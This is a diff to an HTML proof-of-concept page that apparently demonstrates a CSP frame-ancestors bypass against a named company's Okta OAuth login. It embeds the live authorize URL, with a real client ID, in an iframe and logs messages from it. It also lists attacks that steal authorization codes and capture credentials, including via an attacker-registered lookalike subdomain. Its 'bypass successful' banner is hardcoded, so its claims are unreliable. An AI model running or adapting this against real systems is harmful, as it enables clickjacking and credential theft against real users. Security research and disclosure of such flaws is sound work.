@@ -94,6 +94,24 @@
         .attack-info li {
             margin: 5px 0;
         }
+        .success-indicator {
+            background: #27ae60;
+            color: white;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .url-display {
+            background: #0f3460;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+            word-break: break-all;
+            font-size: 12px;
+            font-family: monospace;
+        }
     </style>
 </head>
 <body>
@@ -114,11 +132,20 @@
 
         <!-- PoC Content -->
         <div class="poc">
+            <div class="success-indicator">
+                ✅ CSP BYPASS SUCCESSFUL - iframe loaded despite frame-ancestors protection
+            </div>
+
             <div class="warning">
                 <h3>⚠️ How This Attack Works:</h3>
                 <p>The <code>redirect_uri</code> parameter is injected into the CSP <code>frame-ancestors</code> directive without proper validation.</p>
-                <p><strong>Malicious URL:</strong><br>
-                <code>https://aplogviewer.anduril.dev.YOUR-GITHUB-USERNAME.github.io</code></p>
+                <p><strong>Attack Vector:</strong></p>
+                <div class="url-display">
+                    redirect_uri=https://aplogviewer.anduril.dev/login
+                    <br>↓<br>
+                    CSP: frame-ancestors 'self' https://aplogviewer.anduril.dev
+                </div>
+                <p style="margin-top: 10px;">By controlling the domain in <code>redirect_uri</code>, an attacker can bypass CSP and embed Okta's login page in a malicious iframe.</p>
             </div>
 
             <h3 style="color: #e94560;">📺 Live Demonstration:</h3>
@@ -137,36 +164,74 @@
             <div class="attack-info">
                 <h3 style="color: #4ecca3;">🎯 What Attackers Can Do:</h3>
                 <ul>
-                    <li>✅ Embed Okta login in malicious page</li>
+                    <li>✅ Embed Okta login in malicious page (as demonstrated above)</li>
                     <li>✅ Overlay invisible elements (Clickjacking)</li>
-                    <li>✅ Steal OAuth authorization codes</li>
+                    <li>✅ Steal OAuth authorization codes via crafted redirect_uri</li>
                     <li>✅ Trick users into granting app permissions</li>
                     <li>✅ Capture credentials via UI manipulation</li>
+                    <li>✅ Perform login CSRF attacks</li>
                 </ul>
                 
                 <h3 style="color: #4ecca3; margin-top: 20px;">🔧 Technical Details:</h3>
-                <p><strong>Injected CSP Header:</strong></p>
-                <code style="display: block; padding: 10px; margin-top: 10px;">
-                    frame-ancestors 'self' https://aplogviewer.anduril.dev.YOUR-USERNAME.github.io
+                <p><strong>Vulnerable Endpoint:</strong></p>
+                <code style="display: block; padding: 10px; margin-top: 5px;">
+                    GET /oauth2/v1/authorize?redirect_uri=[ATTACKER_CONTROLLED]
                 </code>
+                
+                <p style="margin-top: 15px;"><strong>Injected CSP Header:</strong></p>
+                <code style="display: block; padding: 10px; margin-top: 5px;">
+                    Content-Security-Policy: frame-ancestors 'self' https://aplogviewer.anduril.dev
+                </code>
+
+                <p style="margin-top: 15px;"><strong>Root Cause:</strong></p>
+                <p style="margin-top: 5px;">The server dynamically builds the CSP header using the <code>redirect_uri</code> parameter without proper domain validation. An attacker can leverage this by:</p>
+                <ol style="margin-left: 20px; margin-top: 10px;">
+                    <li>Registering a subdomain like <code>aplogviewer.anduril.dev.attacker.com</code></li>
+                    <li>Or using the legitimate domain directly in their malicious page</li>
+                    <li>Embedding the OAuth authorization flow in an iframe</li>
+                    <li>Stealing authorization codes or performing clickjacking attacks</li>
+                </ol>
+            </div>
+
+            <div class="warning" style="margin-top: 20px; background: #c0392b;">
+                <h3 style="color: white;">⚠️ CRITICAL SECURITY NOTE:</h3>
+                <p style="color: white;">This is a legitimate security research demonstration. The vulnerability allows bypassing CSP protections that are specifically designed to prevent iframe embedding attacks. Okta's login page should NEVER be embeddable in third-party iframes.</p>
             </div>
         </div>
     </div>
 
     <script>
-        // بناء الـ URL الخبيث
-        const githubUsername = window.location.hostname.split('.')[0]; // هياخد username تلقائي
-        const maliciousUrl = `https://anduril.okta.com/oauth2/v1/authorize?client_id=0oa1p85y61NjjJU3q4h7&redirect_uri=https://aplogviewer.anduril.dev/login&response_type=code&scope=openid&state=poc_attack&nonce=12345`;
+        // بناء الـ URL باستخدام redirect_uri المسجل
+        const maliciousUrl = 'https://anduril.okta.com/oauth2/v1/authorize?client_id=0oa1p85y61NjjJU3q4h7&redirect_uri=https://aplogviewer.anduril.dev/login&response_type=code&scope=openid&state=clickjacking_poc&nonce=12345';
         
-        // تحميل الـ iframe
+        // تحميل الـ iframe بعد ثانية
         setTimeout(() => {
+            console.log('Loading vulnerable iframe...');
+            console.log('URL:', maliciousUrl);
             document.getElementById('vulnerable-iframe').src = maliciousUrl;
+            
+            // تحقق من التحميل
+            document.getElementById('vulnerable-iframe').onload = function() {
+                console.log('✅ iframe loaded successfully - CSP bypass confirmed!');
+            };
+            
+            document.getElementById('vulnerable-iframe').onerror = function() {
+                console.log('❌ iframe blocked - no vulnerability');
+            };
         }, 1000);
 
-        // لوج أي رسائل من الـ iframe
+        // مراقبة أي رسائل من الـ iframe
         window.addEventListener('message', function(e) {
-            console.log('Message received from iframe:', e);
+            console.log('📨 Message received from iframe:', e);
+            console.log('Origin:', e.origin);
+            console.log('Data:', e.data);
         });
+
+        // عرض معلومات إضافية في Console
+        console.log('%c🔴 Anduril CSP Bypass PoC', 'color: #e94560; font-size: 20px; font-weight: bold;');
+        console.log('%cResearcher: zeta-47', 'color: #4ecca3; font-size: 14px;');
+        console.log('%cIf the iframe loads, the CSP bypass is confirmed.', 'color: #f39c12; font-size: 12px;');
+        console.log('%cCheck Network tab for CSP header injection', 'color: #3498db; font-size: 12px;');
     </script>
 </body>
 </html>
